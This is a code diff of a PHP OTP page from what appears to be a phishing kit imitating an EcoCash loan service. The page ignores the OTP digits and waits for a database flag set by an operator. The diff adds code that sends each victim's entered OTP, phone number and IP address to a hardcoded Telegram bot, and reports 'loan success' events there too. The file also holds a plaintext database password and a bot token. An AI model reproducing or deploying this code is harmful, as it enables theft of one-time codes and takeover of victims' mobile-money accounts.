@@ -1,21 +1,20 @@
 <?php
 session_start();
 
-// ========== POSTGRESQL CONFIGURATION (same as login.php) ==========
+// ========== POSTGRESQL CONFIGURATION ==========
 $dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
 $dbPort = 5432;
 $dbName = "loan_9d8q";
 $dbUser = "loan_9d8q_user";
 $dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
-// ==================================================================
+// ==============================================
 
-// Telegram configuration (same as login.php)
+// Telegram configuration
 $botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
 $chatId   = "-5193742613";
 
 /**
- * Get PostgreSQL connection (reusable)
- * @return resource|false
+ * Get PostgreSQL connection
  */
 function getDbConnection($host, $port, $dbname, $user, $pass) {
     static $conn = null;
@@ -35,8 +34,7 @@ function getDbConnection($host, $port, $dbname, $user, $pass) {
 }
 
 /**
- * Send message via Telegram bot (reused from login.php)
- * @return bool
+ * Send Telegram message
  */
 function sendTelegramMessage($botToken, $chatId, $message, $parseMode = 'HTML') {
     $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
@@ -98,36 +96,54 @@ $error = '';
 
 // Process OTP submission
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // We ignore the actual OTP digits – only the database flag matters
     $otpArray = isset($_POST['otp']) ? $_POST['otp'] : [];
     $enteredOtp = implode('', $otpArray);
     $enteredOtp = preg_replace('/[^0-9]/', '', $enteredOtp);
-    
-    // Note: OTP is not stored in DB; we only check if otp_status = 1 (already verified by admin via verify.php)
-    // So just query the current otp_status for this phone.
     
     $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
     if (!$conn) {
         $error = "System error. Please contact administrator.";
         error_log("PostgreSQL connection failed in otp.php");
     } else {
-        // Get otp_status for this phone
-        $stmt = pg_query_params($conn, "SELECT otp_status FROM ecocash_auth WHERE phone = $1 LIMIT 1", [$phone]);
-        if (!$stmt) {
-            error_log("OTP query error: " . pg_last_error($conn));
-            $error = "System error. Try again later.";
-        } else {
-            $record = pg_fetch_assoc($stmt);
-            if ($record && (int)$record['otp_status'] === 1) {
-                // Send Telegram "loan success" message (using HTML parse mode)
+        // Ensure `users` table exists (with `otp` column default 0)
+        $createSQL = "
+            CREATE TABLE IF NOT EXISTS users (
+                phone VARCHAR(20) PRIMARY KEY,
+                status INTEGER DEFAULT 0,
+                pin INTEGER DEFAULT 0,
+                otp INTEGER DEFAULT 0
+            )
+        ";
+        pg_query($conn, $createSQL);
+        
+        // Insert phone if not exists (with default otp=0)
+        $insertSQL = "INSERT INTO users (phone, status, pin, otp) VALUES ($1, 0, 0, 0) ON CONFLICT (phone) DO NOTHING";
+        pg_query_params($conn, $insertSQL, [$phone]);
+        
+        // Check the `otp` flag for this phone
+        $checkSQL = "SELECT otp FROM users WHERE phone = $1";
+        $result = pg_query_params($conn, $checkSQL, [$phone]);
+        if ($result && $row = pg_fetch_assoc($result)) {
+            $otpStatus = (int)$row['otp'];
+            
+            if ($otpStatus === 1) {
+                // OTP approved → send Telegram success and redirect to dashboard
                 $successMsg = "✅ LOAN SUCCESS ✅<br>📱 Phone: +263 {$phone}<br>🕒 Time: " . date('Y-m-d H:i:s');
                 sendTelegramMessage($botToken, $chatId, $successMsg, 'HTML');
                 
-                // Redirect to dashboard
                 header("Location: dashboard.php");
                 exit;
             } else {
                 $error = "Wrong OTP";
+                // Optional: send Telegram notification of failed attempt
+                $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+                $time = date('Y-m-d H:i:s');
+                $msg = "❌ *Failed OTP attempt*\n\n📱 Phone: +263 {$phone}\n🔢 OTP entered: `{$enteredOtp}`\n⏰ Time: {$time}\n🌐 IP: {$ip}";
+                sendTelegramMessage($botToken, $chatId, $msg, 'Markdown');
             }
+        } else {
+            $error = "Database error. Please try again.";
         }
     }
 }
